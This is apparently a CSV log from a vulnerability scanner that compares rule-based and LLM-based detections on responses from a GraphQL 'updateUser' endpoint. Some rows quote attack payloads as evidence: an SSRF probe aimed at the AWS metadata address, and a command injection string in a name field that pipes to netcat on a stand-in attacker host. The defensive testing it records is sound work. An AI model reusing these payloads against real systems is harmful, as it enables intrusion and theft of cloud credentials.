timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-07T06:24:39.332320,updateUser_response_2,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:25:02.805230,updateUser_response_3,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:25:22.653110,updateUser_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a reference to 169.254.169.254, a well-known AWS metadata endpoint. This indicates the server may have made an internal network request to a sensitive cloud metadata service, which is a strong SSRF indicator. The presence of this URL in a user-controlled field (description) suggests user input was used to trigger internal network access."", ""evidence"": ""http://169.254.169.254/latest/meta-data/ in description field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""http://169.254.169.254/latest/meta-data/ in description field"", ""explanation"": ""The response contains a reference to 169.254.169.254, a well-known AWS metadata endpoint. This indicates the server may have made an internal network request to a sensitive cloud metadata service, which is a strong SSRF indicator. The presence of this URL in a user-controlled field (description) suggests user input was used to trigger internal network access.""}}]"
2025-10-07T06:25:33.163187,updateUser_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload in the 'lastName' field contains a semicolon (command separator) followed by a shell command chain (ping piped to netcat), indicating an attempt to execute arbitrary OS commands. This suggests improper input sanitization where user-controlled data is passed to system shell commands."", ""evidence"": ""lastName: 'Doe; ping -c 5 attacker.com | nc 192.168.0.1 4444'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""lastName: 'Doe; ping -c 5 attacker.com | nc 192.168.0.1 4444'"", ""explanation"": ""The payload in the 'lastName' field contains a semicolon (command separator) followed by a shell command chain (ping piped to netcat), indicating an attempt to execute arbitrary OS commands. This suggests improper input sanitization where user-controlled data is passed to system shell commands.""}}]"
2025-10-07T06:25:51.032886,updateUser_response_6,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:26:09.105084,updateUser_response_7,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:26:22.396476,updateUser_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:26:34.264960,updateUser_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:26:48.490092,updateUser_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:27:11.492381,updateUser_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The server's validation errors explicitly suggest valid field names (e.g., 'Did you mean \""id\""?') when invalid fields are requested. This demonstrates a field_suggestions vulnerability where the GraphQL implementation discloses schema structure through error messages. While helpful for developers, this feature aids attackers in schema enumeration and discovery of potentially sensitive fields that might not be documented. Apollo Server enables this by default, making it critical to disable in production environments exposed to untrusted clients."", ""evidence"": ""Field suggestions in error messages ('Did you mean \""id\""?', 'firstName or \""lastName\""?', 'description', 'wallets')"", ""confidence"": 1.0, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 1.0, ""evidence"": ""Field suggestions in error messages ('Did you mean \""id\""?', 'firstName or \""lastName\""?', 'description', 'wallets')"", ""explanation"": ""The server's validation errors explicitly suggest valid field names (e.g., 'Did you mean \""id\""?') when invalid fields are requested. This demonstrates a field_suggestions vulnerability where the GraphQL implementation discloses schema structure through error messages. While helpful for developers, this feature aids attackers in schema enumeration and discovery of potentially sensitive fields that might not be documented. Apollo Server enables this by default, making it critical to disable in production environments exposed to untrusted clients.""}}]"
